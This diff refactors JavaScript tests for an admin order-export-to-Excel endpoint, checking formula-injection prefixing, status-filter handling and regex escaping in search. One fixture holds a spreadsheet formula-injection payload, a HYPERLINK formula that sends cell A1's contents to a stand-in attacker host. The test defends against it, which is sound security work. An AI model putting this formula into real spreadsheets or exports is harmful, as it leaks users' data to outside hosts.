@@ -1,8 +1,7 @@
 const request = require('supertest');
 const ExcelJS = require('exceljs');
 const { buildTestApp } = require('../helpers/app');
-const { makeAdminSession } = require('../helpers/factories');
-const Order = require('../../models/Order');
+const { makeAdminSession, makeOrder } = require('../helpers/factories');
 
 // supertest/superagent has no built-in parser for the xlsx content type, so
 // the response has to be buffered manually to get the raw bytes ExcelJS can load.
@@ -11,6 +10,22 @@ function bufferParser(res, cb) {
 	res.on('data', (chunk) => chunks.push(chunk));
 	res.on('end', () => cb(null, Buffer.concat(chunks)));
 }
+
+// A counter sale as the tests first inserted it: no customer details, no stock
+// taken, no status history. Anything else would change what the export shows.
+const directSaleOrder = (fields) => makeOrder({
+	isDirectSale: true,
+	status: 'confirmed',
+	items: [],
+	totalAmount: 0,
+	studentId: undefined,
+	fullName: undefined,
+	email: undefined,
+	phoneNumber: undefined,
+	stockDeducted: false,
+	statusHistory: [],
+	...fields,
+});
 
 describe('GET /api/admin/orders/export/excel', () => {
 	let app;
@@ -21,12 +36,8 @@ describe('GET /api/admin/orders/export/excel', () => {
 
 	it('prefixes a formula-injection payload so Excel renders it as text, not a formula', async () => {
 		const { cookies } = await makeAdminSession(app);
-		await Order.create({
+		await directSaleOrder({
 			orderCode: 'ORDXLS1',
-			isDirectSale: true,
-			status: 'confirmed',
-			items: [],
-			totalAmount: 0,
 			additionalNote: '=HYPERLINK("http://evil.example/"&A1,"click")'
 		});
 
@@ -52,7 +63,7 @@ describe('GET /api/admin/orders/export/excel', () => {
 
 	it('drops an unrecognised status filter instead of silently returning zero rows', async () => {
 		const { cookies } = await makeAdminSession(app);
-		await Order.create({ orderCode: 'ORDXLS2', isDirectSale: true, status: 'confirmed', items: [], totalAmount: 0 });
+		await directSaleOrder({ orderCode: 'ORDXLS2' });
 
 		const res = await request(app)
 			.get('/api/admin/orders/export/excel')
@@ -70,8 +81,8 @@ describe('GET /api/admin/orders/export/excel', () => {
 
 	it('escapes regex metacharacters in the search filter instead of running them as a pattern', async () => {
 		const { cookies } = await makeAdminSession(app);
-		await Order.create({ orderCode: 'ORDX.1', isDirectSale: true, status: 'confirmed', items: [], totalAmount: 0 });
-		await Order.create({ orderCode: 'ORDXY1', isDirectSale: true, status: 'confirmed', items: [], totalAmount: 0 });
+		await directSaleOrder({ orderCode: 'ORDX.1' });
+		await directSaleOrder({ orderCode: 'ORDXY1' });
 
 		const res = await request(app)
 			.get('/api/admin/orders/export/excel')
